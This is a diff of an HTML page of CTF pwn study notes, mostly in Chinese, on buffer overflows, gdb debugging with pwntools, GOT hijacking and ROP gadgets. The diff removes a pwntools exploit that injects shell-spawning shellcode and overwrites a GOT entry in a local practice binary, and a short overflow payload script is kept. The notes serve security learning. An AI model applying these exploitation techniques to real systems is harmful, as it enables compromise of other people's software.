@@ -1079,7 +1079,13 @@ body .markdown-body
 <li><a href="#stack-canary">Stack Canary</a></li>
 <li><a href="#bof-buffer-overflow">bof应用 (buffer overflow)</a></li>
 <li><a href="#offset">如何算offset</a></li>
-<li><a href="#gdb">使用gdb配合脚本调试</a></li>
+<li><a href="#gdb-gdbscript">使用gdb配合脚本调试, gdbscript</a><ul>
+<li><a href="#kaligdb-scriptbug">kali不能执行gdb script的bug</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#bof">bof</a><ul>
 <li><a href="#bof-ret2code">bof-ret2code</a><ul>
 <li><a href="#address">如何找到address? 如何查找函数</a></li>
 </ul>
@@ -1088,12 +1094,12 @@ body .markdown-body
 <li><a href="#shellcode">哪里可以写shellcode?</a></li>
 </ul>
 </li>
+</ul>
+</li>
 <li><a href="#libc">Libc</a><ul>
 <li><a href="#lazy-binding">Lazy binding</a></li>
 <li><a href="#pltgot">plt&amp;got</a></li>
 <li><a href="#got-hijacking">GOT Hijacking</a></li>
-</ul>
-</li>
 </ul>
 </li>
 <li><a href="#fmt">fmt</a><ul>
@@ -1519,7 +1525,8 @@ VV 进入视图模式
 </pre></div>
 
 
-<h4 id="gdb">使用gdb配合脚本调试<a class="headerlink" href="#gdb" title="Permanent link"></a></h4>
+<h4 id="gdb-gdbscript">使用gdb配合脚本调试, gdbscript<a class="headerlink" href="#gdb-gdbscript" title="Permanent link"></a></h4>
+<p>方法1
 <div class="codehilite"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">&#39;./bof1&#39;</span><span class="p">)</span>
 <span class="nb">raw_input</span><span class="p">()</span> <span class="c1"># 这里断下，执行脚本后看pid是多少比如6113</span>
@@ -1531,7 +1538,20 @@ VV 进入视图模式
 <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">flat</span><span class="p">(</span><span class="s">&#39;AAAAAAAA&#39;</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xbeef</span><span class="p">),</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xdead</span><span class="p">)))</span>
 <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </pre></div>
+方法2</p>
+<p><a href="D:/wgf/My%20Documents/Github/blog/text/docs/ctf/scripts/pwn_000_01_gdbattach.py">pwn_000_01_gdbattach</a></p>
+<h5 id="kaligdb-scriptbug">kali不能执行gdb script的bug<a class="headerlink" href="#kaligdb-scriptbug" title="Permanent link"></a></h5>
+<p><a href="https://juejin.im/post/5e68ff69518825494466bc57">https://juejin.im/post/5e68ff69518825494466bc57</a></p>
+<p>方法1:</p>
+<p>sudo update-alternatives &ndash;config x-terminal-emulator</p>
+<p>可用 lxterm, uxterm, xterm</p>
+<p><a href="https://www.cnblogs.com/wgf4242/p/13232979.html">方法2</a></p>
+<div class="codehilite"><pre>vi /home/kali/.local/lib/python3.8/site-packages/pwnlib/util/misc.py
+# 在Launching a new terminal 这一行后面添加
+argv = argv[:-1] + [x.strip(&#39;&quot;&#39;) for x in argv[-1].split()]
+</pre></div>
 
+<h3 id="bof">bof<a class="headerlink" href="#bof" title="Permanent link"></a></h3>
 <h4 id="bof-ret2code">bof-ret2code<a class="headerlink" href="#bof-ret2code" title="Permanent link"></a></h4>
 <ul>
 <li>
@@ -1616,7 +1636,7 @@ r2<span class="nv">$ </span>afl~shell
 </li>
 </ul>
 <p><img alt="" src="imgs/pwn_ret2sc02.jpg" /></p>
-<h4 id="libc">Libc<a class="headerlink" href="#libc" title="Permanent link"></a></h4>
+<h3 id="libc">Libc<a class="headerlink" href="#libc" title="Permanent link"></a></h3>
 <h5 id="lazy-binding">Lazy binding<a class="headerlink" href="#lazy-binding" title="Permanent link"></a></h5>
 <ul>
 <li>
@@ -1662,25 +1682,8 @@ r2<span class="nv">$ </span>afl~shell
 <img alt="" src="imgs/pwn_GOT_Hijacking1.jpg" />
 <img alt="" src="imgs/pwn_GOT_Hijacking2.jpg" />
 <img alt="" src="imgs/pwn_GOT_Hijacking3.jpg" /></p>
-<p>source: <a href="D:/wgf/My%20Documents/Github/blog/text/docs/ctf/practise/pwn_gothijack.c">pwn_gothijack</a></p>
-<p>exp</p>
-<div class="codehilite"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">&#39;./gothijack&#39;</span><span class="p">)</span>
-
-<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;?</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
-<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">&#39;amd64&#39;</span>
-
-<span class="n">sc</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
-
-<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">sc</span><span class="p">)</span>
-
-<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;?</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
-<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mh">0x601018</span><span class="p">))</span> <span class="c1"># </span>
-
-<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;:&#39;</span><span class="p">)</span>
-<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x601080</span><span class="p">))</span> <span class="c1"># 已被shellcode覆盖的原plt地址,</span>
-</pre></div>
-
+<p>source: <a href="D:/wgf/My%20Documents/Github/blog/text/docs/ctf/practise/pwn_04_gothijack.c">pwn_gothijack</a></p>
+<p>exp <a href="D:/wgf/My%20Documents/Github/blog/text/docs/ctf/practise/writeup.md">pwn_gothijack</a></p>
 <h3 id="fmt">fmt<a class="headerlink" href="#fmt" title="Permanent link"></a></h3>
 <ul>
 <li>
@@ -1848,24 +1851,50 @@ BambooFox-2018-2019年合集-107学年社课 (P2. 程式安全-pwn2)</p>
 <p>·利用第一個address來改寫第二個address ，用第二個address來建構真的要的address。</p>
 <p>√  RBP Chain</p>
 <h3 id="rop-gadget">ROP Gadget<a class="headerlink" href="#rop-gadget" title="Permanent link"></a></h3>
+<ul>
+<li>Return Oriented Programming</li>
+<li>透過不断去執行包含ret的程式片段來達到想要的操作</li>
+<li>這些包含ret的程式片段又被稱作gadget</li>
+</ul>
 <p>结尾是ret的程序代码段</p>
-<div class="codehilite"><pre>pop rax
+<div class="codehilite"><pre>add rsp, 0x8
 ret
-</pre></div>
 
-
-<p>或</p>
-<div class="codehilite"><pre>mov rax,rbx
+pop rax
 ret
-</pre></div>
 
+leave
+ret
 
-<p>或</p>
-<div class="codehilite"><pre>lea rax,[local_8h]
+400730: 41 5e   pop r14
+400732: 41 5f   pop r15
+400734: c3      ret
+
+mov rax,rbx
+ret
+
+lea rax,[local_8h]
 mov, rdi, rax
 mov eax, 0
 call sym.imp.gets
 ret
+</pre></div>
+
+
+<p>每个bytes表示的内容不同, 见下面</p>
+<div class="codehilite"><pre>400730: 41 5e   pop r14
+400732: 41 5f   pop r15
+400734: c3      ret
+
+400731: 5e      pop rsi
+400732: 41 5f   pop r15
+400734: c3      ret
+
+400732: 41 5f   pop r15
+400734: c3      ret
+
+400733: 5f      pop rdi
+400734: c3      ret
 </pre></div>
 
 
@@ -1877,6 +1906,10 @@ ROPgadget --binary ./ret2libc3 --string &quot;/bin/sh&quot;
 </pre></div>
 
 <p><img alt="Alt text" src="imgs/pwn_02_ROPgaget.jpg" /></p>
+<p>ret2libc, <a href="https://blog.csdn.net/qq_40827990/article/details/86662079">Link</a></p>
+<p><a href="D:/wgf/My%20Documents/Github/blog/text/docs/ctf/practise/ret2libc1.c">ret2libc1</a>
+<a href="D:/wgf/My%20Documents/Github/blog/text/docs/ctf/practise/ret2libc2.c">ret2libc2</a>
+<a href="D:/wgf/My%20Documents/Github/blog/text/docs/ctf/practise/ret2libc3.c">ret2libc3</a></p>
 <h3 id="stack-migration">stack migration<a class="headerlink" href="#stack-migration" title="Permanent link"></a></h3>
 <ul>
 <li>ROP chain</li>
